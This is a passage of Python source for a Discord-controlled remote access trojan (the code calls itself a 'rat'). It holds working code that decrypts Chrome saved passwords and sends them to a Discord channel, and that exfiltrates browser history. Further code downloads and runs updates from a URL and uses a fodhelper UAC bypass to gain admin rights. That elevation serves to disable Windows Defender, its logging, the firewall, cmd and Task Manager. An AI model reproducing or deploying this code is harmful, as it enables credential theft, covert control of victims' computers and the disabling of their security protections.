                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key

        def decrypt_payload(cipher, payload):
                return cipher.decrypt(payload)
        def generate_cipher(aes_key, iv):
                return AES.new(aes_key, AES.MODE_GCM, iv)
        def decrypt_password(buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = generate_cipher(master_key, iv)
                    decrypted_pass = decrypt_payload(cipher, payload)
                    decrypted_pass = decrypted_pass[:-16].decode()
                    return decrypted_pass
                except Exception as e:
                    return "Chrome < 80"
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
        shutil.copy2(login_db, "Loginvault.db")
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                if len(username) > 0:
                    temp = (os.getenv('TEMP'))
                    output = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n"
                    f4 = open(temp + r"\passwords.txt", 'a')
                    f4.write(str(output))
                    f4.close()
        except Exception as e:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
            file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
            await ctx.channel.send("Successfully collected client passwords", file=file)
            os.system("del %temp%\passwords.txt /f")
        except Exception as e:
                pass

@slash.slash(name="history", description="Grathers the clients browser history from chrome.", guild_ids=g)
async def Historyextractor_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        my_embed = discord.Embed(title="History", description="Grabbing the clients browser history, please wait!", color=16777215)
        my_embed.set_thumbnail(url=f"{embedlogo}")
        await ctx.send(embed=my_embed)
        temp = (os.getenv('TEMP'))
        Username = (os.getenv('USERNAME'))
        shutil.rmtree(temp + r"\history12", ignore_errors=True)
        os.mkdir(temp + r"\history12")
        path_org = r""" "C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\History" """.format(Username)
        path_new = temp + r"\history12"
        copy_me_to_here = (("copy" + path_org + "\"{}\"" ).format(path_new))
        os.system(copy_me_to_here)
        con = sqlite3.connect(path_new + r"\history")
        cursor = con.cursor()
        cursor.execute("SELECT url FROM urls")
        urls = cursor.fetchall()
        for x in urls:
            done = ("".join(x))
            f4 = open(temp + r"\history12" + r"\history.txt", 'a')
            f4.write(str(done))
            f4.write(str("\n"))
            f4.close()
        con.close()
        file = discord.File(temp + r"\history12" + r"\history.txt", filename="history.txt")
        await ctx.send("Successfully grabbed the clients browser history", file=file)
        def deleteme() :
            path = "rmdir " + temp + r"\history12" + " /s /q"
            os.system(path)
        deleteme()

@slash.slash(name="execute", description="Executes a file thats already on the clients PC.", guild_ids=g)
async def StartProc_command(ctx: SlashContext, dirtofile: str):
    if ctx.channel.name == channel_name:
        try:
            os.startfile(dirtofile)
            my_embed = discord.Embed(title="Execute", description="File was successfully executed on the clients PC.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
              my_embed = discord.Embed(title="Execute", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
              my_embed.set_thumbnail(url=f"{embedlogo}")
              await ctx.send(embed=my_embed)


@slash.slash(name="selfdestruct", description="Deletes the rat off the clients PC.", guild_ids=g)
async def SelfDestruct_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            my_embed = discord.Embed(title="Self Destruct", description="Self destructing, please wait!", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
            pid = os.getpid()
            temp = (os.getenv("temp"))
            cwd2 = sys.argv[0]
            data = f"Killed Rat PID: {pid}\n\nRemoved Rat file"
            my_embed = discord.Embed(title="Self Destruct", description="Successfully removed the rat off the clients PC.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
            bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 3 > NUL\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
            temp6 = temp + r"\\kill.bat"
            if os.path.isfile(temp6):
                os.remove(temp6)
            f6 = open(temp + r"\\kill.bat", 'w')
            f6.write(bat)
            f6.close()
            os.system(r"start /min %temp%\\kill.bat")
        except Exception as e:
            my_embed = discord.Embed(title="Self Destruct", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="update", description="Replaces the old rat with the new rat.", guild_ids=g)
async def Update_command(ctx: SlashContext, updated_version_url: str):
    if ctx.channel.name == channel_name:
        try:
            cwd = os.getcwd()
            name = os.path.splitext(os.path.basename(__file__))[0]
            cwd2 = sys.argv[0]
            pid = os.getpid()
            temp = (os.getenv("temp"))

            my_embed = discord.Embed(title="Update", description="Updating the session, please wait!", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

            url = updated_version_url
            r = requests.get(f"{url}")
            with open(f'{cwd}\\${name}.exe', 'wb') as f:
                f.write(r.content)
            f.close()

            bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 2 > NUL\n' + f'start "" "{cwd}\\${name}.exe"\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
            temp6 = temp + r"\\Update.bat"
            if os.path.isfile(temp6):
                os.remove(temp6)
            with open(temp + r"\\Update.bat", 'w') as f6:
                f6.write(bat)
            f6.close()
            os.system(r"start /min %temp%\\Update.bat")
        except Exception as e:
            my_embed = discord.Embed(title="Update", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="website", description="Launches a website on the clients PC.", guild_ids=g)
async def StartWebsite_command(ctx: SlashContext, chosen_website: str):
    if ctx.channel.name == channel_name: 
        try:
            website = chosen_website
            def OpenBrowser(URL):
                if not URL.startswith('http'):
                    URL = 'http://' + URL
                subprocess.call('start ' + URL, shell=True) 
            OpenBrowser(website)
            my_embed = discord.Embed(title="Website", description=f"Successfully launched the website on the clients PC.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="Website", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

@slash.slash(name="renablesettings", description="Renables the clients settings on their PC.", guild_ids=g)
async def RenableSettings_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            class disable_fsr():
                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                def __enter__(self):
                    self.old_value = ctypes.c_long()
                    self.success = self.disable(ctypes.byref(self.old_value))
                def __exit__(self, type, value, traceback):
                    if self.success:
                        self.revert(self.old_value)
            my_embed = discord.Embed(title="Settings", description="Attempting to renable the clients settings.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

            ###### CREATE BATCH FILE ######
            temp = (os.getenv("temp"))
            bat = """
    reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /f
    cls
            """
            temp2 = temp + r"\\sys.bat"
            if os.path.isfile(temp2):
                os.remove(temp2)
            f6 = open(temp + r"\\sys.bat", 'w')
            f6.write(bat)
            f6.close()

            ###### FORCE RUN BATCH FILE AS ADMIN ######
            create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
            os.system(create_reg_path)
            create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
            os.system(create_trigger_reg_key) 
            create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c """ + '""' + '"' + '"' + temp2 + '""' +  '"' + '"\'"' + """ -Force"""
            os.system(create_payload_reg_key)
            with disable_fsr():
                os.system("fodhelper.exe")
            time.sleep(2)
            remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
            os.system(remove_reg)
        except Exception as e:
            my_embed = discord.Embed(title="Settings", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

@slash.slash(name="disablesettings", description="Disables the clients settings on their PC.", guild_ids=g)
async def DisableSettings_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            class disable_fsr():
                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                def __enter__(self):
                    self.old_value = ctypes.c_long()
                    self.success = self.disable(ctypes.byref(self.old_value))
                def __exit__(self, type, value, traceback):
                    if self.success:
                        self.revert(self.old_value)
            my_embed = discord.Embed(title="Settings", description="Attempting to disable the clients settings.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

            ###### CREATE BATCH FILE ######
            temp = (os.getenv("temp"))
            bat = """
    reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoControlPanel" /t REG_DWORD /d "1" /f
    cls
            """
            temp2 = temp + r"\\sys.bat"
            if os.path.isfile(temp2):
                os.remove(temp2)
            f6 = open(temp + r"\\sys.bat", 'w')
            f6.write(bat)
            f6.close()

            ###### FORCE RUN BATCH FILE AS ADMIN ######
            create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
            os.system(create_reg_path)
            create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
            os.system(create_trigger_reg_key) 
            create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c """ + '""' + '"' + '"' + temp2 + '""' +  '"' + '"\'"' + """ -Force"""
            os.system(create_payload_reg_key)
            with disable_fsr():
                os.system("fodhelper.exe")
            time.sleep(2)
            remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
            os.system(remove_reg)
        except Exception as e:
            my_embed = discord.Embed(title="Settings", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
            
#enable Taskmanager
@slash.slash(name="renabletaskmanager", description="Renables the clients task manager on their PC.", guild_ids=g)
async def RenableTaskmgr_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes
        import os
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                global statusuusss
                import time
                statusuusss = None
                import subprocess
                import os
                instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
                def shell():
                    output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    global status
                    statusuusss = "ok"
                    return output
                import threading
                shel = threading.Thread(target=shell)
                shel._running = True
                shel.start()
                time.sleep(1)
                shel._running = False
                result = str(shell().stdout.decode('CP437'))
                if len(result) <= 5:
                    my_embed = discord.Embed(title="Task Manager", description="Successfully enabled the clients task manager on their PC.", color=16777215)
                    my_embed.set_thumbnail(url=f"{embedlogo}")
                    await ctx.send(embed=my_embed)
                else:
                    import winreg as reg
                    reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                    my_embed = discord.Embed(title="Task Manager", description="Successfully renabled the clients task manager on their PC.", color=16777215)
                    my_embed.set_thumbnail(url=f"{embedlogo}")
                    await ctx.send(embed=my_embed)
        else:
            my_embed = discord.Embed(title="Task Manager", description="Session does not have admin permissions.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

##disables Taskmanager
@slash.slash(name="disabletaskmanager", description="Disables the clients task manager on their PC.", guild_ids=g)
async def DisableTaskmgr_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        import ctypes
        import os
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if is_admin == True:
            global statuuusss
            import time
            statuuusss = None
            import subprocess
            import os
            instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                statuuusss = "ok"
                return output
            import threading
            shel = threading.Thread(target=shell)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            result = str(shell().stdout.decode('CP437'))
            if len(result) <= 5:
                import winreg as reg
                reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                import os
                os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
            else:
                import os
                os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
                my_embed = discord.Embed(title="Task Manager", description="Successfully disabled the clients task manager on their PC.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
        else:
            my_embed = discord.Embed(title="Task Manager", description="Session does not have admin permissions.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="renableantivirus", description="Renables the clients antivirus on their PC.", guild_ids=g)
async def RenableAntivirus_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            class disable_fsr():
                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                def __enter__(self):
                    self.old_value = ctypes.c_long()
                    self.success = self.disable(ctypes.byref(self.old_value))
                def __exit__(self, type, value, traceback):
                    if self.success:
                        self.revert(self.old_value)
            my_embed = discord.Embed(title="Anti Virus", description="Attempting to renable the clients antivirus.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

            ###### CREATE BATCH FILE ######
            temp = (os.getenv("temp"))
            bat = """
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /f
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /f
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /f
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /f
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /f
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /f
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /f
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /f
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /f
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /f
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /f
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /f
    cls
    rem 0 - Disable Logging
    reg delete "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /f
    reg delete "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /f
    cls
    rem Disable WD Tasks
    schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
    cls 
    rem Disable WD systray icon
    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f
    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
    cls
    rem Remove WD context menu
    reg add "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
    reg add "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
    reg add "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
    cls
    rem Disable WD services
    reg delete "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /f
    reg delete "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /f
    reg delete "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /f
    reg delete "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /f
    reg delete "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" f
    cls
            """
            temp2 = temp + r"\\av.bat"
            if os.path.isfile(temp2):
                os.remove(temp2)
            f6 = open(temp + r"\\av.bat", 'w')
            f6.write(bat)
            f6.close()

            ###### FORCE RUN BATCH FILE AS ADMIN ######
            create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
            os.system(create_reg_path)
            create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
            os.system(create_trigger_reg_key) 
            create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c """ + '""' + '"' + '"' + temp2 + '""' +  '"' + '"\'"' + """ -Force"""
            os.system(create_payload_reg_key)
            with disable_fsr():
                os.system("fodhelper.exe")
            time.sleep(2)
            remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
            os.system(remove_reg)
        except Exception as e:
            my_embed = discord.Embed(title="Anti Virus", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

@slash.slash(name="disableantivirus", description="Disables the clients antivirus on their PC.", guild_ids=g)
async def DisableAntivirus_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            class disable_fsr():
                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                def __enter__(self):
                    self.old_value = ctypes.c_long()
                    self.success = self.disable(ctypes.byref(self.old_value))
                def __exit__(self, type, value, traceback):
                    if self.success:
                        self.revert(self.old_value)
            my_embed = discord.Embed(title="Anti Virus", description="Attempting to renable the clients antivirus.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

            ###### CREATE BATCH FILE ######
            temp = (os.getenv("temp"))
            bat = """
    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f
    cls
    rem 0 - Disable Logging
    reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
    reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
    cls
    rem Disable WD Tasks
    schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
    cls 
    rem Disable WD systray icon
    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f
    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
    cls
    rem Remove WD context menu
    reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
    reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
    reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
    cls
    rem Disable WD services
    reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
    reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
    reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
    reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
    reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
    cls
            """
            temp2 = temp + r"\\av.bat"
            if os.path.isfile(temp2):
                os.remove(temp2)
            f6 = open(temp + r"\\av.bat", 'w')
            f6.write(bat)
            f6.close()

            ###### FORCE RUN BATCH FILE AS ADMIN ######
            create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
            os.system(create_reg_path)
            create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
            os.system(create_trigger_reg_key) 
            create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c """ + '""' + '"' + '"' + temp2 + '""' +  '"' + '"\'"' + """ -Force"""
            os.system(create_payload_reg_key)
            with disable_fsr():
                os.system("fodhelper.exe")
            time.sleep(2)
            remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
            os.system(remove_reg)
        except Exception as e:
            my_embed = discord.Embed(title="Anti Virus", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)


@slash.slash(name="disablefirewall", description="Disables the clients firewall on their PC.", guild_ids=g)
async def Disablefirewall_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            def isAdmin():
                try:
                    is_admin = (os.getuid() == 0)
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin
            if isAdmin():
                os.system("NetSh Advfirewall set allprofiles state off")
                my_embed = discord.Embed(title="Firewall", description="Successfully disabled the clients firewall", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)
            else:
                my_embed = discord.Embed(title="Firewall", description="Session requires admin permissions to use this command.", color=16777215)
                my_embed.set_thumbnail(url=f"{embedlogo}")
                await ctx.send(embed=my_embed)  
        except Exception as e:
            my_embed = discord.Embed(title="Firewall", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)
            
@slash.slash(name="disablecmd", description="Disables the clients cmd on their PC.", guild_ids=g)
async def DisableCmd_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            class disable_fsr():
                disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
                def __enter__(self):
                    self.old_value = ctypes.c_long()
                    self.success = self.disable(ctypes.byref(self.old_value))
                def __exit__(self, type, value, traceback):
                    if self.success:
                        self.revert(self.old_value)
            my_embed = discord.Embed(title="Cmd", description="Attempting to disable the clients cmd.", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)

            ###### CREATE BATCH FILE ######
            temp = (os.getenv("temp"))
            bat = """
    reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /f
    reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d "1" /f
    cls
            """
            temp2 = temp + r"\\cmd.bat"
            if os.path.isfile(temp2):
                os.remove(temp2)
            f6 = open(temp + r"\\cmd.bat", 'w')
            f6.write(bat)
            f6.close()

            ###### FORCE RUN BATCH FILE AS ADMIN ######
            create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
            os.system(create_reg_path)
            create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
            os.system(create_trigger_reg_key) 
            create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c """ + '""' + '"' + '"' + temp2 + '""' +  '"' + '"\'"' + """ -Force"""
            os.system(create_payload_reg_key)
            with disable_fsr():
                os.system("fodhelper.exe")
            time.sleep(2)
            remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
            os.system(remove_reg)
        except Exception as e:
            my_embed = discord.Embed(title="Cmd", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
            await ctx.send(embed=my_embed)  

@slash.slash(name="listproccess", description="Lists every existing process thats currently running on the clients PC.", guild_ids=g)
async def listProccess_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            if 1==1:
                result = subprocess.getoutput("tasklist")
                numb = len(result)
                if numb < 1:
                    await ctx.send("Command not recognized or no output was obtained")
                elif numb > 1990:
                    temp = (os.getenv('TEMP'))
                    if os.path.isfile(temp + r"\\output.txt"):
                        os.system(r"del %temp%\\output.txt /f")
                    f1 = open(temp + r"\\output.txt", 'a')
                    f1.write(result)
                    f1.close()
                    my_embed = discord.Embed(title="List Proccess", description="Successfully got the clients proccess.", color=16777215)
                    my_embed.set_thumbnail(url=f"{embedlogo}")
                    await ctx.send(embed=my_embed)  
                    file = discord.File(temp + r"\\output.txt", filename="output.txt")
                    await ctx.send(file=file)
                else:
                    my_embed = discord.Embed(title=f"Clients proccess: {result}", color=0x00FF00)
                    await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title="List Proccess", description=f"Error has occured!\nDetails: **{e}**", color=16777215)
            my_embed.set_thumbnail(url=f"{embedlogo}")
